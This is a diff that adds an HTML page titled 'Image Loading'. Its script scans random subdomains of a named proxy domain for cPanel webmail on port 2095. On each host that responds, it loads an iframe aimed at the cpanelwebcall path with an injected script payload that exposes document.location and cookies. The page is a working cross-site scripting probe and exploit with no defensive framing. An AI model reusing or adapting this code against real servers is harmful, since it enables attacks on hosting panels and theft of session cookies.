@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Image Loading</title>
+</head>
+
+<body>
+  <script>
+    // Function to generate a random string of length 10
+    function generateRandomString() {
+      let randomString = '';
+      for (let i = 0; i < 5; i++) {
+        randomString += Math.random().toString(36).charAt(2) + Math.random().toString(36).charAt(2);
+      }
+      return randomString;
+    }
+
+    let imageElements = [];
+
+    // Function to handle image onload event
+    function onLoad(event) {
+      let imageUrl = event.target.src;
+      alert(`Image loaded successfully: ${imageUrl}`);
+      let origHost = new URL(imageUrl).host;
+      let randomString = generateRandomString();
+      let newUrl = `http://${origHost}/cpanelwebcall/<img%20src=x%20onerror=alert(document.location+document.cookie)>`;
+      // Create an iframe and load the URL
+      let iframe = document.createElement('iframe');
+      iframe.src = newUrl;
+      iframe.style.width = '500px';
+      iframe.style.height = '300px';
+      document.body.appendChild(iframe);
+    }
+
+    // Function to handle image onerror event
+    function onError(event) {
+      console.error(`Image failed to load: ${event.target.src}`);
+    }
+
+    // Function to cancel loading of current images
+    function cancelCurrentImages() {
+      imageElements.forEach(img => {
+        img.src = ''; // Clear the src attribute
+        img.remove(); // Remove the image element from the DOM
+      });
+      imageElements = []; // Clear the array for the next batch
+    }
+
+    // Function to load a batch of images
+    function loadBatch(batchNumber) {
+      if (batchNumber > 0) {
+        cancelCurrentImages(); // Cancel loading of previous batch
+      }
+
+      for (let i = 0; i < 40; i++) { // Load 100 images per batch
+        let randomString = generateRandomString();
+        let imageUrl = `http://${randomString}.webproxy.id.myoas.net:2095/unprotected/cpanel/images/webmail-logo.svg`;
+
+        let imgTag = document.createElement('img');
+        imgTag.src = imageUrl;
+        imgTag.onerror = onError;
+        imgTag.onload = onLoad;
+
+        document.body.appendChild(imgTag);
+        imageElements.push(imgTag); // Add the image element to the array
+      }
+
+      if (batchNumber < 10) { // Total 10 batches to make 1000 images
+        setTimeout(() => loadBatch(batchNumber + 1), 3000); // Wait for 3 seconds before next batch
+      }
+    }
+
+    // Start loading images in batches
+    setTimeout(() => {
+      loadBatch(0);
+    }, 3000)
+  </script>
+</body>
+
+</html>
